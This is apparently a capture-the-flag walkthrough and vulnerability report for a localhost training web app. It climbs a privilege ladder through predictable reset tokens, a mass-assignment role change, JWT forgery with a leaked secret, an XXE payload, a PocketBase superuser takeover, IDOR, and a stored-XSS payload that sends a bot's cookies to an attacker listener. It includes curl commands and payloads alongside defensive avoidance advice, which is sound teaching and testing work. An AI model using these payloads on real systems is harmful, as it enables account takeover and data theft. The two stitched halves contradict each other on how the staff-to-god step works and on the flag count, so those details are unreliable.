# Darkly — Mandatory Walkthrough

**Target:** `http://localhost:4942` (FastAPI + PocketBase backend on `:8090`)
**Goal:** Recover 6 flags — 4 obtained by escalating privileges step by step up to
administrator (highest application account, `god`), plus 2 flags of choice from
other weaknesses.

**Final result: 6/6 flags — ladder fully climbed, from `visitor` to `god` + PocketBase superuser.**

---

## 1. Privilege ladder of the application

```
Visitor ──► Student ──► Cadet ──► Staff ──► God ──► [PocketBase superuser]
                       (flag 1)  (flag 2)  (flag 3)      (flag 4)
```

Roles exposed by `/api/docs-internal`:
`role_values: [visitor, student, cadet, staff, god]`

---

## 2. Steps to become god (each step = 1 flag)

### Step 0 — Foothold: account takeover via predictable reset token

> **Full repro:** [05 — Password reset token disclosure](05-password-reset-token-disclosure/README.md) · script: `exploit.sh` · no flag

- `POST /reset-password/request` leaks the reset token in the `Location`
  redirect header for **any** email, existing or not.
- Tokens are literally `md5(email)` — fully predictable.
- Used it against `jdoe@student.42.tech` → reset password → valid `student`
  session.

**Weakness:** predictable password-reset tokens + token disclosure in response.

### Step 1 — Student → Cadet — `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}`

> **Full repro:** [01 — Self role escalation](01-self-role-escalation-flag/README.md) · script: `exploit.sh` · flag: `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}`

- `PATCH /api/profile` accepts a client-supplied `role` field.
- Server rejects `staff`/`admin` ("role not assignable") but **not `cadet`**.
- After re-login (JWT caches the old role), `/staff/dashboard` unlocks and
  shows the banner flag.

```bash
curl -X PATCH http://localhost:4942/api/profile \
  -b cookies_jdoe.txt -H 'Content-Type: application/json' \
  -d '{"role":"cadet"}'
# re-login, then:
curl -b cookies_jdoe.txt http://localhost:4942/staff/dashboard
# 🔓 Cadet+ access granted — internal staff flag: FLAG{just_p4tch_y0ur_0wn_r0l3_lol}
```

**Weakness:** self-service role escalation (incomplete allow-list).

### Step 2 — Cadet → Staff — `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}`

> **Full repro:** [02 — JWT secret forgery](02-jwt-secret-forgery-flag/README.md) · scripts: `forge_jwt.py`, `exploit.sh` · flag: `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}`

- Session JWT: HS256, payload `{sub, login, role, exp}`.
- Deploy log (HTML comment on every page) discloses the JWT secret history:
  `"42"` → `"42network"` (current).
- Forge a `role: staff` token signed with `42network` → `/admin` unlocks
  (403 → 200) and the admin panel submissions table reveals the flag.

```bash
# forge with secret "42network", role=staff, same sub/exp shape
curl -b session=<forged_jwt> http://localhost:4942/admin
# submissions table: FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}
```

**Weakness:** hardcoded/disclosed JWT signing secret (secret reuse) →
arbitrary role claim forgery.

### Step 3 — Staff → God — `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`

> **Full repro:** [03 — Stored XSS bot SSRF](03-stored-xss-bot-ssrf-flag/README.md) · script: `ssrf-relay.sh` · flag: `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`

- `/agenda` XML import uses stdlib `xml.etree` with no server-side validation
  (site's own HTML comments call it out).
- XXE: external entities let the server fetch internal resources from its own
  vantage point (localhost-only endpoints are unreachable directly — 403 from
  outside).
- Used the XXE/SSRF proxy to read `/internal/config`, which leaks the
  PocketBase superuser credentials (see Step 4) and the flag.

```xml
<?xml version="1.0"?>
<!DOCTYPE agenda [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:4942/internal/config">
]>
<agenda><event>&xxe;</event></agenda>
```

**Weakness:** XXE / SSRF (unvalidated XML import) → bypass of
localhost-only access control on `/internal/config`.

### Step 4 — God + PocketBase superuser — `FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}`

> **Full repro:** [04 — PocketBase superuser takeover](04-pocketbase-superuser-takeover-flag-god/README.md) · script: `exploit.sh` · flag: `FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}`

- Credentials from Step 3 authenticate against the PocketBase admin API
  (`http://localhost:8090/_/`, exposed in dashboard HTML comments).
- With the superuser token (`/tmp/pbtok`), full access to all 9 collections:
  `users, posts, comments, projects, grades, newsletter, agenda_imports,
  internal_config, internal_audit`.
- The `internal_audit` collection contains the final ladder flag.

```bash
curl "http://127.0.0.1:8090/api/collections/internal_audit/records?perPage=200" \
  -H "Authorization: <pb_superuser_token>"
# FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}
```

**Weakness:** secrets in plaintext config + under-protected PocketBase admin
instance (superuser creds recoverable from the app itself).

---

## 3. Flags of choice (2 additional weaknesses)

### Flag 5 — IDOR on profiles — `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}`

> **Full repro:** [06 — Profile IDOR](06-profile-idor-flag/README.md) · script: `exploit.sh` · flag: `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}`

- `/profile/{id}` and `/api/users/{id}` have **no ownership check**: any
  authenticated user can read any other account's full record, including
  `private_note` (wil's record holds the flag), `pw_hint` (`md5(password)`)
  and `recovery_code` for every user.

```bash
curl -b cookies_jdoe.txt http://localhost:4942/api/users/k1asdfeditojrb4   # wil
```

### Flag 6 — Stored XSS → bot cookie theft — `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`

> **Full repro:** [07 — Stored XSS cookie theft](07-stored-xss-cookie-theft-flag/README.md) · scripts: `post-payload.sh`, `xss-listener.py` · flag: `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`

- Forum comments render user HTML unescaped ("HTML is supported").
- A moderation bot (headless Chrome, runs inside the VM) visits new/updated
  threads with a live session and a **non-httpOnly `flag` cookie**.
- Posted a comment with `<img src=x onerror=fetch(...)>` payload; the bot
  executed it and exfiltrated its cookies to our listener within ~2 min:

```
flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}
session=<moderator JWT, role=student>
```

(Scripts: `findings/repro-05-post-payload.sh`, `repro-05-xss-listener.py`.)

### Spare flag — reset-token recovery leak — `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`

> **Full repro:** [05 — Password reset token disclosure](05-password-reset-token-disclosure/README.md) (same breach family, see [06 — Profile IDOR](06-profile-idor-flag/README.md) for the read primitive)

- Discovered alongside the IDOR: benjamin/dorian/thanos's `recovery_code`
  field leaks this flag and confirms reset tokens are `md5(...)`-derived
  (ties back to Step 0).

---

## 4. Vulnerabilities exploited (summary)

1. **Predictable password-reset tokens** — token = md5-derived, disclosed in
   the `Location` header → full account takeover.
   ([repro](05-password-reset-token-disclosure/README.md))
2. **Self-service role escalation** — `PATCH /api/profile` allows `cadet`
   (only `staff`/`admin` blocked) → real, persisted privilege grant.
   ([repro](01-self-role-escalation-flag/README.md))
3. **JWT secret disclosure + secret reuse** — old and current secrets leak in
   a deploy-log HTML comment → arbitrary claim (role) forgery.
   ([repro](02-jwt-secret-forgery-flag/README.md))
4. **XXE / SSRF** — stdlib `xml.etree`, unvalidated XML import → server-side
   requests bypass the localhost-only restriction on `/internal/config`.
   ([repro](03-stored-xss-bot-ssrf-flag/README.md))
5. **Plaintext secrets / weak PB admin protection** — superuser credentials
   readable in internal config, PocketBase admin reachable and unhardened.
   ([repro](04-pocketbase-superuser-takeover-flag-god/README.md))
6. **IDOR** — `/profile/{id}` and `/api/users/{id}` lack ownership checks →
   `private_note`, `pw_hint`, `recovery_code` exposed for all users.
   ([repro](06-profile-idor-flag/README.md))
7. **Stored XSS** — forum comments rendered raw + non-httpOnly `flag` cookie
   on a privileged bot → cookie/session theft.
   ([repro](07-stored-xss-cookie-theft-flag/README.md))
8. **Information disclosure** — debug headers, HTML comments, robots.txt,
   internal API schema (`/api/docs-internal`) map the whole attack surface.
   ([repro](09-header-robots-info-disclosure/README.md))

---

## Annex A — Flag / vulnerability matrix

| # | Flag | Step / tier | Vulnerability | Location of flag |
|---|------|-------------|---------------|------------------|
| 1 | `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}` | Student → **Cadet** | Broken access control (self role-escalation via PATCH) | `/staff/dashboard` banner |
| 2 | `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}` | Cadet → **Staff** | JWT secret disclosure + claim forgery | `/admin` submissions table |
| 3 | `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}` | Staff → **God** | XXE/SSRF on XML import | `/internal/config` (localhost-only) |
| 4 | `FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}` | God → **PB superuser** | Plaintext secrets / weak PB admin | PocketBase `internal_audit` collection |
| 5 | `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}` | (of choice) | IDOR on `/profile/{id}` & `/api/users/{id}` | wil's `private_note` |
| 6 | `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}` | (of choice) | Stored XSS + non-httpOnly bot cookie | Exfiltrated from moderation bot |
| + | `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}` | (spare) | IDOR / predictable reset tokens | `recovery_code` field (benjamin, dorian, thanos) |

## Annex B — Escalation graph

```
                        ┌──────────────────────────────────────────────────────┐
                        │              PRIVILEGE ESCALATION LADDER             │
                        └──────────────────────────────────────────────────────┘

  Visitor
     │  password reset token = md5(email), leaked in Location header
     ▼
  Student ──────────────────────────────────────────────────────────────┐
     │  PATCH /api/profile {"role":"cadet"} (allow-list gap)            │
     ▼                                                                 │
  Cadet ──────────────── 🚩 FLAG{just_p4tch_y0ur_0wn_r0l3_lol}         │
     │  forge JWT with leaked secret "42network", role=staff           │
     ▼                                                                 │
  Staff ───────────────── 🚩 FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}       │
     │  XXE on /agenda XML import → SSRF to 127.0.0.1                  │
     ▼                                                                 │
  God ──────────────────── 🚩 FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}     │
     │  superuser creds from /internal/config → PocketBase /_/         │
     ▼                                                                 │
  PB Superuser ─────────── 🚩 FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y} │
                                                                       │
  SIDE CHANNELS (flags of choice):                                     │
     IDOR /profile/{id}  ────── 🚩 FLAG{1d0r_ur_pr0f1l3_1s_m1n3}       │
     Stored XSS → bot    ────── 🚩 FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}│
     IDOR recovery_code  ────── 🚩 FLAG{r3s3t_t0k3n_w4s_just_md5_lol}  │
                                                                       │
  7 flags total recovered (requirement: 6 — 4 escalation + 2 choice) ◄─┘
```

## Annex C — Chain-of-trust diagram

```
 [reset-token leak]──► student acct (jdoe)
        │
        ▼
 [PATCH role=cadet]──► cadet ──► /staff/dashboard ──► FLAG 1
        │
        ▼
 [JWT secret "42network" from deploy log]──► forged staff token ──► /admin ──► FLAG 2
        │
        ▼
 [XXE on /agenda]──► SSRF as server ──► /internal/config ──► FLAG 3 + PB creds
        │
        ▼
 [PB superuser auth]──► /_/ collections ──► internal_audit ──► FLAG 4
        │
 (parallel, any auth level)
        ├── [IDOR /api/users/{id}] ──► private_note ──► FLAG 5
        ├── [XSS in forum comments] ──► bot cookie theft ──► FLAG 6
        └── [IDOR recovery_code] ──► spare flag
```
# 10 Vulnerabilities of the Platform — How they work, impact, avoidance

Target: http://localhost:4942 (app) + http://localhost:8090 (PocketBase).
Flags recovered: 6 (4 escalation-step flags + 2 of choice), documented across
findings 01–10 in `../findings/`. Detailed per-breach reproductions live in
the sibling `*-flag/` folders.

| # | Vulnerability | Finding | Flag(s) yielded |
|---|---------------|---------|-----------------|
| 1 | Predictable password-reset tokens (`md5(email)`) | 01 | `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}` |
| 2 | JWT signed with hardcoded weak secret (`"42network"`) | 02 | `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}` |
| 3 | Mass assignment on `PATCH /api/profile` (`role` field) | 03 | `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}` |
| 4 | IDOR on `/profile/{id}` (private notes of other users) | 04 | `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}` |
| 5 | Stored XSS in forum comments → bot cookie theft | 05 | `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}` |
| 6 | SSRF/relay via moderation bot → `/internal/config` | 06 | `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}` |
| 7 | PocketBase superuser takeover → full DB control | 07 | `FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}` |
| 8 | Reflected XSS on `/newsletter` success banner | 08 | none |
| 9 | Info disclosure: HTTP headers + robots.txt | 09 | none |
| 10 | Unrestricted arbitrary file download (no allowlist) | 10 | none |

Privilege ladder used for the 4 escalation flags:
`student → cadet (#3) → staff (#2 forgery) → god (#6 SSRF → #7 PB takeover)`.

---

## 1. Predictable password-reset tokens — `md5(email)`

> **Breach folder:** [05 — Password reset token disclosure](05-password-reset-token-disclosure/README.md)

**How it works.** The recovery flow derives the reset token directly from the
user's email: `token = md5(email)`. Worse, `/api/users/{id}` exposes the
`recovery_code` field, so both the email (public profile data) and the code
itself are obtainable. Request a reset for any identity, compute
`md5(email)`, complete the reset.

**Impact.** Account takeover of *any* account — including `wil` (staff) and
`sophie` (god) — without needing their passwords. Reset flows are the
highest-trust unauthenticated endpoints on most platforms.

**Avoidance.** Generate tokens with a CSPRNG (`secrets.token_urlsafe(32)`),
bind them to a short expiry and single use, store only their hash, and never
expose recovery material through object APIs.

## 2. JWT signed with a hardcoded weak secret

> **Breach folder:** [02 — JWT secret forgery](02-jwt-secret-forgery-flag/README.md)

**How it works.** The signing secret is the literal string `"42network"`
(leaked via the admin submissions table / deploy log). Anyone who knows it
can forge a token with arbitrary `login`/`role` claims with HS256 and the
server will accept it.

**Impact.** Full impersonation of any user at any role without touching the
password-reset flow — the backbone of escalation gate 2.

**Avoidance.** Long random per-environment secrets from a secrets manager,
never hardcoded or printed in logs; short-lived tokens; asymmetric keys
(EdDSA/RS256) so token *verification* never requires sharing the secret;
rotate on any suspicion of leak.

## 3. Mass assignment on `PATCH /api/profile`

> **Breach folder:** [01 — Self role escalation](01-self-role-escalation-flag/README.md)

**How it works.** The profile self-update endpoint copies the whole request
body onto the user record without a field allowlist, so a client adds
`{"role": "cadet"}` and the server dutifully changes its own role.

**Impact.** Direct self-service privilege escalation (gate 1) and,
combined with #2, any role in one step.

**Avoidance.** Explicit allowlists of editable fields (`name`, `avatar`,
`bio`…); role changes only through an admin-only endpoint with
server-side authorization; reject unknown fields.

## 4. IDOR on `/profile/{id}`

> **Breach folder:** [06 — Profile IDOR](06-profile-idor-flag/README.md)

**How it works.** Profile pages fetch records by sequential ID with no check
that the requester owns the object, so `private_note` fields of other users
are read simply by walking IDs (or following references in forum posts).

**Impact.** Bulk disclosure of private user data; the platform's own private
notes leak (`FLAG{1d0r_ur_pr0f1l3_1s_m1n3}`), often containing hints that
unlock further breaches.

**Avoidance.** Object-level authorization: every read/write must verify the
record belongs to the authenticated user (or a permitted role); return 403/404
otherwise. Avoid sequential public IDs where possible (UUIDs slow enumeration,
but are *not* a substitute for the authz check).

## 5. Stored XSS in forum comments

> **Breach folder:** [07 — Stored XSS cookie theft](07-stored-xss-cookie-theft-flag/README.md)

**How it works.** Comment `content` is stored raw and rendered raw ("HTML is
supported"). A privileged moderation bot visits every new/updated thread with
a live session, and its `flag` cookie is not `httpOnly`. A one-time
`<img onerror=fetch(...)>` payload makes the bot leak its cookies to an
attacker-controlled listener.

**Impact.** Session hijack and flag theft (`FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`);
more importantly it gives an attacker code execution *inside* a privileged
browser context — the pivot used in #6.

**Avoidance.** Escape all user HTML (or run a strict allow-list sanitizer);
mark every privileged cookie `httpOnly` + `SameSite`; run moderation bots
with throwaway, least-privilege sessions.

## 6. SSRF / same-origin relay via the moderation bot

> **Breach folder:** [03 — Stored XSS bot SSRF](03-stored-xss-bot-ssrf-flag/README.md)

**How it works.** Because #5 lets us run JS inside the bot's browser, we can
make the bot perform `fetch('/internal/config')` — an endpoint reachable only
from the server itself (direct requests get `forbidden`) — and send the
response body back to our external listener.

**Impact.** Exfiltration of localhost-only secrets: the internal config
(`FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`) including **plaintext PocketBase
superuser credentials**, which hand the attacker the keys to the entire data
store.

**Avoidance.** Never execute attacker HTML in a privileged browser context;
place internal services on a separate network the browser container cannot
reach; require authentication *and* loopback source on internal endpoints;
store secrets out of the config path entirely.

## 7. PocketBase superuser takeover

> **Breach folder:** [04 — PocketBase superuser takeover](04-pocketbase-superuser-takeover-flag-god/README.md)

**How it works.** The superuser credentials obtained in #6 are plaintext in
`/internal/config`, and PocketBase's admin UI (`:8090/_/`) is reachable.
Logging in as superuser grants unrestricted read/write over every collection
— including the `internal_audit` table holding the god-tier flag — and lets
us edit any user's `role` straight in the database.

**Impact.** Total compromise of the application's data layer: mass account
takeover, record tampering, permanent backdoors. Highest impact finding of
the assessment (`FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}`).

**Avoidance.** Bind the PB admin API to localhost only (or a management VPN);
store superuser secrets hashed in a secrets manager; alert on superuser
logins; never seed secrets in plaintext config files.

## 8. Reflected XSS on the `/newsletter` success banner

> **Breach folder:** [08 — Reflected XSS newsletter banner](08-reflected-xss-newsletter-banner/README.md)

**How it works.** `POST /newsletter` redirects with the raw email in the
query string; the success banner echoes it back **unescaped**, while the
very same value is correctly escaped in the `<input value=...>` —
inconsistent output encoding between contexts.

**Impact.** One crafted link runs attacker JS on the site origin for anyone
who clicks it (credential/cookie theft, phishing). No flag, but the same
class of bug as #5 and a cheap win for an attacker.

**Avoidance.** Context-aware output escaping on every rendered value; server-side
input validation (reject markup in emails); global auto-escaping templates.

## 9. Information disclosure via HTTP headers and robots.txt

> **Breach folder:** [09 — Header / robots.txt info disclosure](09-header-robots-info-disclosure/README.md)

**How it works.** Every response carries `x-pocketbase: http://localhost:8090`,
`x-42-internal: campus=paris`, plus `x-powered-by`/`Server` version strings;
`robots.txt` enumerates `/admin`, `/staff`, `/internal`, `/backup`,
`/api/docs-internal`.

**Impact.** Removes reconnaissance guesswork: exact DB admin address,
stack + versions for CVE lookup, and a map of where sensitive functionality
lives. Force-multiplier for #2, #6 and #7.

**Avoidance.** Strip internal/debug headers in production; return a minimal
`Server` header; treat robots.txt purely as a crawler hint, never as access
control; keep hidden routes hidden by *authentication*, not by obscurity.

## 10. Unrestricted arbitrary file download

> **Breach folder:** [10 — Unrestricted file download](10-unrestricted-file-download/README.md)

**How it works.** `/projects/download?file=<name>` resolves the parameter
directly against the assets directory with no allowlist; any in-directory
file is served to unauthenticated visitors. Traversal sequences are blocked
(verified), but nothing restricts *which* named files may be fetched, and
`not found` vs `forbidden` responses leak which files exist.

**Impact.** Arbitrary in-directory file disclosure; internal documents (the
staff guide naming `/internal/config` and JWT hints) materially advance the
other breaches.

**Avoidance.** Serve downloads by allowlisted asset IDs; keep sensitive
documents outside the web root; return one generic error for both missing
and denied files.

---

## Summary of the chain

The four escalation-step flags fall in order: #3 (self-escalate to `cadet`)
→ #2 (forge a `staff` token with the leaked secret) → #6 (SSRF relay through
the bot steals `/internal/config`, including PB superuser creds) → #7
(superuser takeover, grant self `god`, dump `internal_audit`). The two
choice flags are #4 (IDOR private-note leak) and #5 (stored-XSS cookie
theft) — with #5 also being the technical enabler of #6. The remaining
findings (#1 reset tokens, #8 reflected XSS, #9 disclosure, #10 file
download) are independent weaknesses that either enable account takeover or
lower the cost of the main chain.

## Annex D — Breach reproduction links

Each breach has its own folder with a README (explanation), an exploit script,
and a flag file when the breach yields one:

- [01 — Self role escalation (student → cadet)](01-self-role-escalation-flag/README.md) — `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}`
- [02 — JWT secret forgery (cadet → staff)](02-jwt-secret-forgery-flag/README.md) — `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}`
- [03 — Stored XSS bot SSRF (staff → god pivot)](03-stored-xss-bot-ssrf-flag/README.md) — `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}`
- [04 — PocketBase superuser takeover (→ god)](04-pocketbase-superuser-takeover-flag-god/README.md) — `FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}`
- [05 — Password reset token disclosure (foothold)](05-password-reset-token-disclosure/README.md) — no flag
- [06 — Profile IDOR](06-profile-idor-flag/README.md) — `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}`
- [07 — Stored XSS cookie theft](07-stored-xss-cookie-theft-flag/README.md) — `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`
- [08 — Reflected XSS newsletter banner](08-reflected-xss-newsletter-banner/README.md) — no flag
- [09 — Header / robots.txt info disclosure](09-header-robots-info-disclosure/README.md) — no flag
- [10 — Unrestricted file download](10-unrestricted-file-download/README.md) — no flag
